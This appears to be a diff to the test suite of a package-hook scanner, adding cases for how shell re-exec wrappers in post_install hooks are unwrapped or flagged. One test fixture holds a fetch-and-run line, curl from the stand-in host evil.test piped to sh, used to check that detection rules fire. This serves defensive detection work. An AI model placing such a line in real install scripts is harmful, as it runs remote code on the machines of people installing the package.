@@ -28,10 +28,24 @@ def _install_diff(body: str, *, whole_file: bool = True) -> str:
     )
 
 
-def test_interpreter_in_an_install_hook_fires():
+def test_a_literal_reexec_wrapper_is_unwrapped_not_flagged():
+    # Debian packaging wraps every hook body in `/bin/sh -c '<body>'`.  The
+    # wrapper executes its inner literal, so the inner body is the subject.
     text = _install_diff(
         "post_install() {\n"
-        "  bash -c 'echo pwned'\n"
+        "  /bin/sh -c '#!/bin/sh\n"
+        "set -eu\n"
+        "exit 0\n"
+        "' -- \"$@\"\n"
+        "}\n"
+    )
+    assert "C016" not in _rule_ids(text)
+
+
+def test_interpreter_inside_a_literal_wrapper_fires():
+    text = _install_diff(
+        "post_install() {\n"
+        "  sh -c 'bash /usr/share/x.sh'\n"
         "}\n"
     )
     fact = scan_diff(text, package_name="demo")
@@ -40,6 +54,25 @@ def test_interpreter_in_an_install_hook_fires():
     finding = next(e for e in fact.score_breakdown if e.rule_id == "C016")
     assert finding.file == "demo.install"
     assert finding.line is not None
+
+
+def test_a_dynamic_reexec_argument_still_fires():
+    # `sh -c "$x"` cannot be unwrapped: the interpreter token stays visible.
+    assert "C016" in _rule_ids(_install_diff(
+        "post_install() {\n"
+        '  sh -c "$x"\n'
+        "}\n"
+    ))
+
+
+def test_a_literal_wrapper_around_a_fetch_fires_c016_and_r001():
+    ids = _rule_ids(_install_diff(
+        "post_install() {\n"
+        "  sh -c 'curl http://evil.test/x | sh'\n"
+        "}\n"
+    ))
+    assert "C016" in ids
+    assert "R001" in ids
 
 
 def test_a_hook_write_to_root_home_fires_but_etc_skel_does_not():
